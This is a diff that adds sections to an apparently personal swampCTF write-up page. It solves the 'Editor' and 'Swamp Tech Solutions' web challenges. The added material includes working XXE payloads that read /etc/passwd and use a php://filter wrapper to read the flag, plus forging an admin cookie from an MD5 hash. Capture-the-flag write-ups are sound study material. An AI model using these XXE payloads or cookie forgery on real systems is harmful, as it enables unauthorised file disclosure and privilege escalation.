@@ -34,6 +34,78 @@ export default function Post() {
                 # swampCTF{Hwaboon_the_Tony_Nominated_Plant_Assistant_from_Maybe_Happy_Ending}
                 `}
             />
+            <X.H2>Editor</X.H2>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import requests
+
+                url = "http://chals.swampctf.com:47821/flag.txt"
+
+                resp = requests.get(url, headers={"Referer": "http://chals.swampctf.com:47821/"})
+
+                print(resp.text, resp.status_code)
+
+                # swampCTF{c55_qu3r135_n07_j5}
+                `}
+            />
+            <X.P>I opened a ticket to ask whether this was an intended solution, and here's the messages from the mod:</X.P>
+            <X.Image src="web1-1.jpg" width="800px" />
+            <X.H2>Swamp Tech Solutions</X.H2>
+            <X.H3>Explore</X.H3>
+            <X.P>An admin page `/adminpage.php` is found in the `robots.txt` file; guest credentials `guest:iambutalowlyguest` are found in the page source.</X.P>
+            <X.P>Login with the credentials, and find cookie `user=084e0343a0486ff05530df6c705c8bb4`, which is the MD5 hash of `guest`. We can change it to `21232f297a57a5a743894a0e4a801fc3`, which is the MD5 hash of `admin`, to get admin privileges.</X.P>
+            <X.P>In the admin page, there's a hidden form `xmlForm`, which posts some XML data to `/process.php`.</X.P>
+            <X.H3>Exploit</X.H3>
+            <X.P>Let's try XXE:</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import requests
+
+                url = "http://chals.swampctf.com:40043/process.php"
+
+                xml = """
+                <!DOCTYPE root [
+                  <!ENTITY fileContents SYSTEM "file:///etc/passwd">
+                ]>
+                <root>
+                <name>&fileContents;</name>
+                <email>1</email>
+                </root>
+                """
+                resp = requests.post(url, data={"submitdata": xml})
+
+                print(resp.text)
+                `}
+            />
+            <X.P>It works! However, when I try to access `/var/www/html/flag.txt`, the server raises an error (not sure for the reason here). Then I tried `php://`:</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import requests
+
+                url = "http://chals.swampctf.com:40043/process.php"
+
+                xml = """
+                <!DOCTYPE root [
+                <!ENTITY fileContents SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt">
+                ]>
+                <root>
+                <name>&fileContents;</name>
+                <email>1</email>
+                </root>
+                """
+
+                resp = requests.post(url, data={"submitdata": xml})
+
+                print(resp.text)
+
+                # <h3>Thank you for actually doing your work, c3dhbXBDVEZ7VzByazFOZ19DSDQxTDVfPHI+X0Z1Tn0K. You're safe for now...</h3>
+                # swampCTF{W0rk1Ng_CH41L5_<r>_FuN}
+                `}
+            />
+            <X.P>We get the Base64 encoded flag ~ \o/</X.P>
             <X.H1>Reversing</X.H1>
             <X.H2>You Shall Not Passss</X.H2>
             <X.P>The code is dynamically generated, I use frida to hook the `munmap` function, so that I can get the start address of `v1` by printing the first argument, then I can get the memory content of `v1`.</X.P>
@@ -262,7 +334,7 @@ export default function Post() {
                         continue
 
                     i = int(b, 2)
-                    if i < 0x3f:
+                    if i < 0x20:
                         print(i & 0xf, end="")
                     else:
                         print(chr(i & 0xff), end="")
